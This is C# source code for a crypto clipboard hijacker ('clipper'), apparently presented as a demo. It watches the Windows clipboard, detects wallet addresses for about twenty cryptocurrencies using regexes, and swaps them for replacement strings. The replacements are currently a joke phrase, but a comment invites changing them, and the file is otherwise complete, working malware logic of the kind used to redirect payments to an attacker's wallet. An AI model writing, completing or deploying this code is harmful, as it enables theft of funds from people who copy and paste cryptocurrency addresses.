using System;
using System.Collections.Generic;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;

namespace Clipped
{
    // Portable clipboard monitor - no install, no registry.
    // Detects and replaces addresses for multiple crypto types.
    internal static class Program
    {
        // Replacement addresses per crypto (change as needed for your demo)
        private const string BtcReplacement   = "Poof—your digital paper dollars disappear.";
        private const string EthReplacement   = "Poof—your digital paper dollars disappear.";
        private const string LtcReplacement   = "Poof—your digital paper dollars disappear.";
        private const string SolReplacement   = "Poof—your digital paper dollars disappear.";
        private const string DogeReplacement  = "Poof—your digital paper dollars disappear.";
        private const string TrxReplacement   = "Poof—your digital paper dollars disappear.";
        private const string XrpReplacement   = "Poof—your digital paper dollars disappear.";
        private const string BnbReplacement   = "Poof—your digital paper dollars disappear.";
        private const string AdaReplacement   = "Poof—your digital paper dollars disappear.";
        private const string DotReplacement   = "Poof—your digital paper dollars disappear.";
        private const string BchReplacement   = "Poof—your digital paper dollars disappear.";
        private const string DashReplacement  = "Poof—your digital paper dollars disappear.";
        private const string ZecReplacement   = "Poof—your digital paper dollars disappear.";
        private const string XmrReplacement   = "Poof—your digital paper dollars disappear.";
        private const string XlmReplacement   = "Poof—your digital paper dollars disappear.";
        private const string EosReplacement   = "Poof—your digital paper dollars disappear.";
        private const string NeoReplacement   = "Poof—your digital paper dollars disappear.";
        private const string IotaReplacement  = "Poof—your digital paper dollars disappear.";
        private const string NanoReplacement  = "Poof—your digital paper dollars disappear.";
        private const string AlgoReplacement  = "Poof—your digital paper dollars disappear.";
        private const string DefaultReplacement = "Poof—your digital paper dollars disappear.";

        private const int CheckIntervalMs = 150;
        private const int IdleIntervalMs = 800;
        private const bool VerboseLogging = false;

        private static readonly RegexOptions Compiled = RegexOptions.Compiled | RegexOptions.IgnoreCase;

        // Bitcoin: Legacy (1...), P2SH (3...), Bech32 (bc1q...), Bech32m (bc1p...)
        private static readonly Regex BtcRegex = new Regex(
            @"^(bc1[a-z0-9]{39,59}|bc1p[a-z0-9]{39,59}|[13][a-zA-HJ-NP-Z0-9]{25,34})$", Compiled);

        // Ethereum / EVM: 0x + 40 hex
        private static readonly Regex EthRegex = new Regex(
            @"^0x[a-fA-F0-9]{40}$", Compiled);

        // Litecoin: L/M (legacy), 3 (P2SH), ltc1 (Bech32)
        private static readonly Regex LtcRegex = new Regex(
            @"^(ltc1[a-z0-9]{39,59}|[LM3][a-zA-HJ-NP-Z0-9]{26,33})$", Compiled);

        // Solana: Base58, 32–44 chars (no 0,O,I,l)
        private static readonly Regex SolRegex = new Regex(
            @"^[1-9A-HJ-NP-Za-km-z]{32,44}$", Compiled);

        // Dogecoin: D (legacy), 9/A (aux), 3 (P2SH)
        private static readonly Regex DogeRegex = new Regex(
            @"^[D39A][a-zA-HJ-NP-Z0-9]{26,34}$", Compiled);

        // Tron: T + Base58, 34 chars
        private static readonly Regex TrxRegex = new Regex(
            @"^T[a-zA-HJ-NP-Z0-9]{33}$", Compiled);

        // XRP: r + base58 (25–34 chars) or X-address
        private static readonly Regex XrpRegex = new Regex(
            @"^(r[0-9a-zA-Z]{24,34}|X[0-9a-zA-Z]{46})$", Compiled);

        // BNB / BSC: 0x like Ethereum, or bnb1 (Bech32)
        private static readonly Regex BnbRegex = new Regex(
            @"^(0x[a-fA-F0-9]{40}|bnb1[a-z0-9]{38})$", Compiled);

        // Cardano (ADA): bech32-style addr1... and stake1... (approximate)
        private static readonly Regex AdaRegex = new Regex(
            @"^(addr1[0-9a-z]{20,}|stake1[0-9a-z]{20,})$", Compiled);

        // Polkadot (DOT): SS58, base58 ~47 chars (approximate)
        private static readonly Regex DotRegex = new Regex(
            @"^[1-9A-HJ-NP-Za-km-z]{47}$", Compiled);

        // Bitcoin Cash (BCH): cashaddr, optional prefix, q/p start (approximate)
        private static readonly Regex BchRegex = new Regex(
            @"^(bitcoincash:)?[qp][0-9a-z]{41}$", Compiled);

        // Dash (DASH): X + base58 (25–34 chars approx)
        private static readonly Regex DashRegex = new Regex(
            @"^X[a-km-zA-HJ-NP-Z1-9]{25,34}$", Compiled);

        // Zcash (ZEC): t1/t3 + base58 (approx)
        private static readonly Regex ZecRegex = new Regex(
            @"^t[13][a-km-zA-HJ-NP-Z1-9]{33}$", Compiled);

        // Monero (XMR): 4 or 8 + 94 chars (approx)
        private static readonly Regex XmrRegex = new Regex(
            @"^[48][0-9A-Za-z]{94}$", Compiled);

        // Stellar (XLM): G + 55 base32 chars
        private static readonly Regex XlmRegex = new Regex(
            @"^G[A-Z2-7]{55}$", Compiled);

        // EOS: 1–12 chars a-z1-5 and dots (approx)
        private static readonly Regex EosRegex = new Regex(
            @"^[a-z1-5.]{1,12}$", Compiled);

        // NEO: A + base58 (approx 34 chars)
        private static readonly Regex NeoRegex = new Regex(
            @"^A[0-9a-zA-Z]{33}$", Compiled);

        // IOTA: bech32-style iota1...
        private static readonly Regex IotaRegex = new Regex(
            @"^iota1[0-9a-z]{20,}$", Compiled);

        // Nano (NANO / XRB): nano_/xrb_ + 60 chars of custom base32 (approx)
        private static readonly Regex NanoRegex = new Regex(
            @"^(nano_|xrb_)[13][13456789abcdefghijkmnopqrstuwxyz]{60}$", Compiled);

        // Algorand (ALGO): 58-char base32 (approx)
        private static readonly Regex AlgoRegex = new Regex(
            @"^[A-Z2-7]{58}$", Compiled);

        private static readonly List<CryptoRule> Rules = new List<CryptoRule>();

        // Order matters: more specific patterns first (e.g. 0x = ETH, T... = TRX, then BTC/LTC/DOGE for 3...)
        static Program()
        {
            Rules.Add(new CryptoRule("ETH",   EthRegex,   EthReplacement));
            Rules.Add(new CryptoRule("BNB",   BnbRegex,   BnbReplacement));
            Rules.Add(new CryptoRule("TRX",   TrxRegex,   TrxReplacement));
            Rules.Add(new CryptoRule("XRP",   XrpRegex,   XrpReplacement));
            Rules.Add(new CryptoRule("ADA",   AdaRegex,   AdaReplacement));
            Rules.Add(new CryptoRule("DOT",   DotRegex,   DotReplacement));
            Rules.Add(new CryptoRule("XLM",   XlmRegex,   XlmReplacement));
            Rules.Add(new CryptoRule("NANO",  NanoRegex,  NanoReplacement));
            Rules.Add(new CryptoRule("IOTA",  IotaRegex,  IotaReplacement));
            Rules.Add(new CryptoRule("XMR",   XmrRegex,   XmrReplacement));
            Rules.Add(new CryptoRule("BCH",   BchRegex,   BchReplacement));
            Rules.Add(new CryptoRule("BTC",   BtcRegex,   BtcReplacement));
            Rules.Add(new CryptoRule("LTC",   LtcRegex,   LtcReplacement));
            Rules.Add(new CryptoRule("DOGE",  DogeRegex,  DogeReplacement));
            Rules.Add(new CryptoRule("DASH",  DashRegex,  DashReplacement));
            Rules.Add(new CryptoRule("ZEC",   ZecRegex,   ZecReplacement));
            Rules.Add(new CryptoRule("NEO",   NeoRegex,   NeoReplacement));
            Rules.Add(new CryptoRule("ALGO",  AlgoRegex,  AlgoReplacement));
            Rules.Add(new CryptoRule("EOS",   EosRegex,   EosReplacement));
            Rules.Add(new CryptoRule("SOL",   SolRegex,   SolReplacement));
        }

        [STAThread]
        private static void Main()
        {
            Log("BtcClip starting (multi-crypto).", force: true);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            string lastText = null;

            while (true)
            {
                try
                {
                    Thread.Sleep(CheckIntervalMs);

                    string text = null;
                    try
                    {
                        if (Clipboard.ContainsText())
                            text = Clipboard.GetText();
                    }
                    catch (Exception ex)
                    {
                        Log("Clipboard read error: " + ex.Message, force: true);
                    }

                    if (string.IsNullOrWhiteSpace(text))
                    {
                        lastText = null;
                        Thread.Sleep(IdleIntervalMs);
                        continue;
                    }

                    text = text.Trim();

                    if (string.Equals(text, lastText, StringComparison.Ordinal))
                    {
                        Thread.Sleep(IdleIntervalMs);
                        continue;
                    }

                    CryptoRule matched = null;
                    foreach (var rule in Rules)
                    {
                        if (rule.Regex.IsMatch(text))
                        {
                            matched = rule;
                            break;
                        }
                    }

                    if (matched == null)
                    {
                        lastText = text;
                        Thread.Sleep(IdleIntervalMs);
                        continue;
                    }

                    lastText = text;
                    Log(matched.Name + " address detected, replacing.", force: true);
                    try
                    {
                        Clipboard.SetText(matched.Replacement);
                        Log("Clipboard set to " + matched.Name + " replacement.", force: true);
                    }
                    catch (Exception ex)
                    {
                        Log("Clipboard set error: " + ex.Message, force: true);
                    }

                    Thread.Sleep(IdleIntervalMs);
                }
                catch (Exception ex)
                {
                    Log("Error: " + ex.Message, force: true);
                    Thread.Sleep(1000);
                }
            }
        }

        private static void Log(string message, bool force = false)
        {
            if (!force && !VerboseLogging) return;
            Console.WriteLine("[{0:HH:mm:ss.fff}] {1}", DateTime.Now, message);
        }

        private sealed class CryptoRule
        {
            public readonly string Name;
            public readonly Regex Regex;
            public readonly string Replacement;

            public CryptoRule(string name, Regex regex, string replacement)
            {
                Name = name;
                Regex = regex;
                Replacement = replacement;
            }
        }
    }
}
